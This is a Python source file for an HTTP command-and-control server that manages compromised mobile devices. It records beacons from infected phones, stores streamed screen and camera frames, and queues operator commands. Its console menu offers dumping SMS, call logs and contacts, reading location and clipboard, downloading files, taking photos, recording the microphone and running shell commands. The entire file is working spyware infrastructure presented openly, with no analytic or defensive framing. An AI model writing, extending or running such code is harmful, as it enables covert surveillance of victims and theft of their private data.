# language: Python, file: server.py, target: Python 3.8+
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import threading, base64, time, os

DEVICES = {}
RESULTS = {}
QUEUE = {}

class Handler(BaseHTTPRequestHandler):
    def log_message(self, *a): pass

    def _send(self, body):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(body.encode())

    def do_GET(self):
        p = urlparse(self.path)
        q = parse_qs(p.query)
        if p.path == "/cmd":
            did = q.get("id", [""])[0]
            q_ = QUEUE.get(did, [])
            self._send(q_.pop(0) if q_ else "NONE")
        elif p.path == "/results":
            did = q.get("id", [""])[0]
            self._send("\n---\n".join(RESULTS.get(did, [])[-5:]) or "NONE")
        elif p.path == "/lastframe":
            did = q.get("id", [""])[0]
            try:
                with open(f"frames/{did}/last.jpg", "rb") as f:
                    data = f.read()
                self.send_response(200)
                self.send_header("Content-Type", "image/jpeg")
                self.send_header("Cache-Control", "no-store")
                self.end_headers()
                self.wfile.write(data)
            except FileNotFoundError:
                self._send("NONE")
        elif p.path == "/list":
            now = time.time()
            out = []
            for did, info in DEVICES.items():
                out.append(f"{did} | {info.get('model','?')} | bat={info.get('battery','?')} | {int(now-info.get('last',0))}s ago")
            self._send("\n".join(out) if out else "NONE")
        else:
            self._send("ok")

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", "replace")
        params = parse_qs(body)
        p = urlparse(self.path)

        if p.path == "/beacon":
            did = params.get("id", ["?"])[0]
            DEVICES[did] = {
                "last": time.time(),
                "model": params.get("model", ["?"])[0],
                "battery": params.get("battery", ["?"])[0],
            }
            print(f"[beacon] {did} | model={DEVICES[did]['model']} | bat={DEVICES[did]['battery']}", flush=True)
        elif p.path == "/screen":
            did = params.get("id", [""])[0]
            frame = params.get("frame", [""])[0]
            n = params.get("n", ["0"])[0]
            try:
                raw = base64.b64decode(frame)
                os.makedirs(f"frames/{did}", exist_ok=True)
                open(f"frames/{did}/last.jpg", "wb").write(raw)
                open(f"frames/{did}/{int(time.time()*1000)}_{n}.jpg", "wb").write(raw)
            except Exception:
                pass
        elif p.path == "/queue":
            did = params.get("id", [""])[0]
            cmd = params.get("cmd", [""])[0]
            arg = params.get("arg", [""])[0]
            QUEUE.setdefault(did, []).append(f"{cmd}|{arg}")
            print(f"[queue] {did} <- {cmd} {arg}", flush=True)
        elif p.path == "/result":
            did = params.get("id", ["?"])[0]
            data = params.get("data", [""])[0]
            RESULTS.setdefault(did, []).append(data)
            if len(data) > 200 and not data.startswith(("FROM:", "ERR", "D ", "F ")):
                try:
                    raw = base64.b64decode(data)
                    fname = f"capture_{did}_{int(time.time())}.bin"
                    open(fname, "wb").write(raw)
                    print(f"[+] saved {fname} ({len(raw)} bytes)")
                except Exception:
                    print(f"[<] {did}: {data[:200]}")
            else:
                print(f"[<] {did}: {data[:500]}")
        self._send("ok")

def cli():
    print("C2 ready. Commands:")
    print("  list                       - show devices")
    print("  <id> sms|calls|contacts    - dump data")
    print("  <id> location|clipboard|apps")
    print("  <id> files <path>          - list files")
    print("  <id> download <path>       - download file")
    print("  <id> photo                 - take photo")
    print("  <id> mic <sec>             - record mic")
    print("  <id> shell <cmd>           - run shell cmd")
    print("  <id> stream_cam            - start camera stream")
    print("  <id> stream_screen         - start screen stream")
    print("  <id> stream_stop           - stop stream")
    print("  results <id>               - show results")
    while True:
        try:
            line = input("c2> ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if not line: continue
        if line == "list":
            for k, v in DEVICES.items():
                print(f"  {k} | {v['model']} | bat={v['battery']} | age={int(time.time()-v['last'])}s")
            continue
        if line.startswith("results "):
            did = line.split(" ", 1)[1]
            for r in RESULTS.get(did, [])[-10:]:
                print(r[:2000])
            continue
        parts = line.split(" ", 2)
        if len(parts) < 2:
            print("?"); continue
        did, cmd = parts[0], parts[1]
        arg = parts[2] if len(parts) > 2 else ""
        QUEUE.setdefault(did, []).append(f"{cmd}|{arg}")
        print(f"queued for {did}: {cmd} {arg}")

if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 8080))
    HTTPServer(("0.0.0.0", port), Handler).serve_forever()
